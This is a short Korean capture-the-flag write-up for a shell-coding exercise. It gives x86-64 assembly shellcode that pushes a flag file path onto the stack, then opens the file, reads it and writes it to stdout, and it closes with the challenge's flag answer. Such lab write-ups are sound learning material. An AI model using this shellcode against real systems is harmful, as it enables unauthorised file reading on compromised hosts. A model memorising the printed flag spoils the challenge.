# 실습

**/home/shell_basic/flag_name_is_loooooong 경로로 셀 코드를 작성해서**

서버로 보내면 되는 문제이다

이전에 `orw.c`로 `/home/alex0/pwnable/flag` 를 8바이트식 끊어서 보내봤으므로

그거와 똑같이 짜주면 된다

![image](https://github.com/user-attachments/assets/398c3039-a080-441f-8a63-f73b01bde90b)

**readflag.asm**

```nasm
section .text
global _start
_start:
    mov rax, 0x00
    push rax
    mov rax, 0x676E6F6F6F6F6F6F
    push rax
    mov rax, 0x6C5F73695F656D61
    push rax
    mov rax, 0x6E5F67616C662F63
    push rax
    mov rax, 0x697361625F6C6C65
    push rax
    mov rax, 0x68732F656D6F682F
    push rax

    mov rdi, rsp
    xor rsi, rsi   
    xor rdx, rdx
    mov rax, 2
    syscall 

    mov rdi, rax     
    mov rsi, rsp
    sub rsi, 0x30    
    mov rdx, 0x30  
    mov rax, 0x0    
    syscall      

    mov rdi, 1   
    mov rax, 0x1   
    syscall
   
```

이 파일을 아래 명령어를 통해 서버로 보내면

셀 코드를 얻을 수 있다
![image (8)](https://github.com/user-attachments/assets/dddf0a24-6f83-4834-8b4d-275a8d7cf6cb)


**정답 : DH{ca562d7cf1db6c55cb11c4ec350a3c0b}**
